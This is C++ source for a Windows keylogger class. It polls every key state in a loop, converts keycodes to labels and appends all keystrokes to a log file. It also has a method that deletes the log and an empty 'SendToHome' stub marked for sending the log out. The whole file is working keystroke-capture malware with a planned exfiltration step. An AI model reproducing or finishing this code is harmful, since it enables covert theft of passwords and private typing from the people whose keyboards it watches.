#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING

#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <experimental/filesystem>

#include "KeyLogger.h"

std::atomic_bool keylogger_cleanup = false;

KeyLogger::KeyLogger(std::string log_file) : log_file(log_file) { }

void KeyLogger::Deploy()
{
	this->CaptureKeys();
}

void KeyLogger::CaptureKeys()
{
	char current_key = 'x';

	while (!keylogger_cleanup) {
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				this->Log(this->GetKeyString(KEY));
			}
		}
	}
}

void KeyLogger::SendToHome()
{
	// send the log file
}

void KeyLogger::CleanUp()
{
	keylogger_cleanup = true;
	std::experimental::filesystem::remove(this->log_file.c_str());
}

KeyLogger::~KeyLogger()
{
	/*this->SendToHome();
	this->CleanUp();*/
}

std::string KeyLogger::GetKeyString(int keycode) {
	switch (keycode) {
	case VK_SPACE:
		return " ";
	case VK_RETURN:
		return "\n";
	case '¾':
		return ".";
	case VK_SHIFT:
		return "#SHIFT#";
	case VK_BACK:
		return "#BACKSPACE#";
	case VK_RBUTTON:
		return "#R_CLICK#";
	case VK_CAPITAL:
		return "#CAPS_LCOK";
	case VK_TAB:
		return "#TAB#";
	case VK_UP:
		return "#UP_ARROW_KEY#";
	case VK_DOWN:
		return "#DOWN_ARROW_KEY#";
	case VK_LEFT:
		return "#LEFT_ARROW_KEY";
	case VK_RIGHT:
		return "#RIGHT_ARROW_KEY#";
	case VK_CONTROL:
		return "#CONTROL#";
	case VK_MENU:
		return "#ALT#";
	default:
		return std::to_string(keycode);
	}
}

bool KeyLogger::Log(std::string text) {
	std::fstream LogFile;
	LogFile.open(this->log_file, std::fstream::app);

	if (LogFile.is_open()) {
		LogFile << text;
		LogFile.close();
		return true;
	}

	return false;
}
